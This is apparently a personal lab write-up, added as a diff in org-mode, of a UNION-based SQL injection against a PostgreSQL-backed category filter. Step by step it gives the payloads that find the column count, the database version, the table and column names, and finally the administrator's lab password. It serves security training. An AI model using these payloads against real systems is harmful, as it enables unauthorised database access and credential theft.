@@ -1,0 +1,83 @@
+#+title: SQL injection attack, listing the database contents on non-Oracle databases
+
+* About
+Vulnerability on ~category~ filter
+
+** Have
++ Login system
++ Table that holds username and password
+
+** End Goal
++ Determine the table name
++ Get credential for ~administrator~ and login
+
+* Steps
+** Step 1
+Determine the number of columns
+#+begin_src sql
+'ORDER BY 1 --
+#+end_src
+
+#+begin_quote
+Number of columns will be 2
+#+end_quote
+
+** Step 2
+Determine the data type those columns are using
+#+begin_src sql
+'UNION SELECT 'ab', 'cd' --
+#+end_src
+#+begin_quote
+Both columns use string data type
+#+end_quote
+
+** Step 3
+Determine which type of database system this lab is using
+#+begin_src sql
+'UNION SELECT @@version, NULL --
+#+end_src
+#+begin_quote
+Error !! So this is not mysql or microsoft database system
+#+end_quote
+
+#+begin_src sql
+'UNION SELECT version(), NULL --
+#+end_src
+#+begin_quote
+Success!! So this is ~PostgreSQL~ database
+#+end_quote
+
+** Step 4
+Find out all tables in the PostgreSQL
+
+#+begin_src sql
+SELECT * FROM information_schema.tables
+#+end_src
+
+We just want to get table names. So our query will be
+#+begin_src sql
+'UNION SELECT table_name, NULL FROM information_schema.tables --
+#+end_src
+
+*** Retrieve Data
+~users_rddprx~
+
+Now get the column names from ~users_rddprx~ table
+
+#+begin_src sql
+'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_rddprx' --
+#+end_src
+
+*** Retrieve Data
++ username_vgfsuf
++ password_chmcao
+
+** Step 5
+Now finally get the all the information from the table
+#+begin_src sql
+'UNION SELECT username_vgfsuf, password_chmcao FROM users_rddprx --
+#+end_src
+
+*** Retrieve Data
++ administrator
++ 420qf8r7ca1jxx8hevxn
